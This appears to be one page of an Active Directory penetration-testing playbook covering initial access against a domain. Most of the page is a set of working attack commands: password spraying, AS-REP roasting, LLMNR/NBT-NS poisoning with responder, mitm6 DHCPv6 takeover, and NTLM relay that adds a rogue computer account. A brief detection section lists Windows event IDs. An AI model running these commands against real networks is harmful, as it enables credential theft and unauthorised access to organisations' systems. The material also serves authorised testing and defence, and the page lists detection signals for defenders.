---
id: initial
type: phase
label: "Initial Access & Foothold"
---


# Initial Access & Foothold

### Objective
Obtain the first valid credential or session without privileges.

### Attack surface
Username harvesting → **password spraying** (respect lockout policy) → **AS-REP roasting** → **anonymous LDAP/SMB** → **LLMNR/NBT-NS poisoning + relay**.

### Exhaustive commands
```bash
# ── Password policy (lockout threshold) ──────────────────────────────
nxc smb 10.10.10.5 -u lowpriv -p '' --pass-pol

# ── Username enumeration ──────────────────────────────────────────────
kerbrute userenum -d corp.local users.txt --dc 10.10.10.5

# ── Password spraying (one password, many users) ─────────────────────
nxc smb 10.10.10.0/24 -u users.txt -p 'Spring2026!' --continue-on-success
kerbrute passwordspray -d corp.local users.txt 'Spring2026!' --dc 10.10.10.5

# ── AS-REP roasting (no creds needed) ────────────────────────────────
impacket-GetNPUsers corp.local/ -usersfile users.txt \
  -dc-ip 10.10.10.5 -format hashcat -outputfile asrep.txt
nxc ldap 10.10.10.5 -u lowpriv -p '' --asreproast asrep.txt

# ── LLMNR / NBT-NS poisoning ─────────────────────────────────────────
responder -I eth0 -wrv

# ── mitm6 (DHCPv6 / DNS takeover) ────────────────────────────────────
mitm6 -d corp.local

# ── NTLM relay (after poisoning) ─────────────────────────────────────
ntlmrelayx.py -t smb://10.10.10.5 -smb2support
ntlmrelayx.py -t ldaps://10.10.10.5 --add-computer PWNED
```

### Detection
**4625/4771 bursts**, **4768 `PreAuthType=0`** for AS-REP, LLMNR/NBT-NS responses from a non-DNS host, and NTLM relay traffic to LDAP/SMB.

---
